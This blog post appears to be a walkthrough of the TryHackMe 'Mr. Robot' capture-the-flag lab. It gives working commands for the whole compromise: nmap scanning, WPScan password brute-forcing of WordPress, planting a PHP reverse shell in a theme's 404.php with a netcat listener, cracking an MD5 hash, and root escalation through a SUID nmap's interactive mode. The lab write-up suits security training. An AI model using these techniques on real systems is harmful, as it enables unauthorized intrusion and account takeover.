# 🕵️‍♂️ TryHackMe: Mr. Robot Room - Full Walkthrough

📌 **Target IP**: `10.10.220.129`  
✍️ **Author**: PentestNinja  
📅 **Date**: June 2025  

---

## 🔌 Step 1: Connect to VPN

Before doing anything — first thing I always do:  
👉 **Connect to TryHackMe VPN network**.

This ensures that my machine is connected to their private network so I can access the target machine.

---

## 🔍 Step 2: Nmap Scan (Finding Open Ports)

Now I wanted to know:  
Which ports are open on this target machine? Which services are running?

🔧 Tool used: **Nmap**

```bash
nmap -sV -O -T4 10.10.220.129

Options explained:

    -sV → Detect version of services (like Apache, OpenSSH etc.)

    -O → Try to detect Operating System

    -T4 → Make scanning faster

    10.10.220.129 → Target machine IP

🧾 Result:

    ✅ Port 22 → SSH open (but not vulnerable)

    ✅ Port 80 → HTTP open → a website is running

🌐 Step 3: Checking Website (robots.txt)

Since port 80 is open, I opened the browser and visited:

http://10.10.220.129

One of the first files I always check is:

http://10.10.220.129/robots.txt

📂 Found in robots.txt:

    ✅ First flag (easy)

    ✅ fsocity.dic → a wordlist file → used later for password brute force

🗂 Step 4: Directory Brute-forcing

Goal: Discover hidden folders or files on the website.

🔧 Tool used: Dirbuster

📍 Target:

http://10.10.220.129

At the same time, I also checked each webpage’s source code (CTRL+U) — sometimes developers leave hints in comments.

🧾 Dirbuster Result:

    ✅ Discovered /wp-login.php
    → This indicates the site is running WordPress CMS

👤 Step 5: Finding Username

Since this room is based on the Mr. Robot TV series and the main character is Elliot, I guessed:

Username = elliot

🔓 Step 6: Brute-force WordPress Password

Used the fsocity.dic file from robots.txt, but it had many duplicates.

🧹 First, cleaned it using:

cat fsocity.dic | sort | uniq > final.txt

Now I have a clean wordlist final.txt.

🔧 Tool used: WPScan

wpscan --url http://10.10.220.129/wp-login.php -U elliot -P final.txt --password-attack wp-login

✅ Result:

    WPScan found the correct password

    Logged in successfully as elliot in WordPress admin panel

🐚 Step 7: Uploading Reverse Shell

🎯 Goal: Get remote shell access to the server.

Steps:

    Downloaded PHP reverse shell from PentestMonkey GitHub

    Edited the file:

    $ip = "<Your THM VPN IP>";
    $port = 4444;

    Uploaded it via:

        Appearance → Theme Editor → 404.php

⚠️ Why 404.php?
→ It runs whenever a non-existent page is accessed — perfect for triggering our shell.
📡 Step 8: Setting up Netcat Listener

Before triggering the shell, I started a listener using:

nc -lvnp 4444

🧾 Explanation:

    nc = Netcat tool

    -l = Listen mode

    -vnp 4444 = Verbose, listen on port 4444

🚀 Step 9: Triggering Reverse Shell

Visited:

http://10.10.220.129/anyrandomstring

Example:

http://10.10.220.129/wjjfejejfuwbdb

✅ Reverse shell received in Netcat
→ Now I had remote command line access on the server
🛠 Step 10: Upgrading Shell

First reverse shell is very limited. So I upgraded it to a full interactive TTY shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Now my shell could:

    Use arrow keys

    Run clear, su

    Handle interactive input properly

🧑‍💻 Step 11: Privilege Escalation to User robot

Explored the system and navigated to:

cd /home/robot

Found:

    ❌ Second flag (access denied)

    ✅ password.raw-md5 file → contained an MD5 hashed password

Viewed the file:

cat password.raw-md5

Got:

robot:<MD5 hash>

🔓 Cracked the hash using:
crackstation.net

✅ Password = atoz

Switched user:

su robot
Password: atoz

→ Now I was user robot
🧠 Step 12: Privilege Escalation to Root

Goal: Gain root access
1️⃣ Checked if robot can use sudo:

sudo -l

→ ❌ No sudo privileges
2️⃣ Looked for SUID binaries:

find / -perm -4000 -type f 2>/dev/null

📍 Found:

/usr/bin/nmap

→ This version of Nmap supports interactive mode
3️⃣ Used Nmap to get root:

nmap --interactive

Inside Nmap shell:

!sh

✅ Result:

whoami
root

🏁 Step 13: Capturing Root Flag

Navigated to root folder:

cd /root
ls -la
cat root.txt

✅ Captured the root flag
📘 What I Learned From This Room

✅ Full enumeration is key:

    robots.txt, source code, hidden folders, SUID binaries

✅ Clean your wordlist before brute-force — saves time
✅ Username guessing can be based on room theme
✅ The 404.php reverse shell trick is very useful
✅ Always upgrade shell to TTY
✅ Privilege escalation can be simple — old tools like Nmap give full root
⚠️ Mistakes to Avoid Next Time

    Should have run find / -perm -4000 -type f earlier — would get root faster

    Forgot to run LinPEAS — must practice using it more

    Wasted time trying to upload reverse shell via plugin — 404.php was easier

    Should always check kernel version — even if not needed here

🚀 Things to Improve

    Practice faster privilege escalation

    Learn more reverse shell methods (Python, Bash, etc.)

    Use WPScan’s advanced features

    Automate common tasks (e.g. wordlist cleanup, shell upgrade)

✅ End of Walkthrough

Thanks for reading!
This was a fun and educational room — great for improving practical hacking skills!

🎯 Happy hacking!
📚 Resources

    🧠 TryHackMe - Mr. Robot Room

    🐚 PentestMonkey PHP Reverse Shell

    🔐 CrackStation - Online Hash Cracker
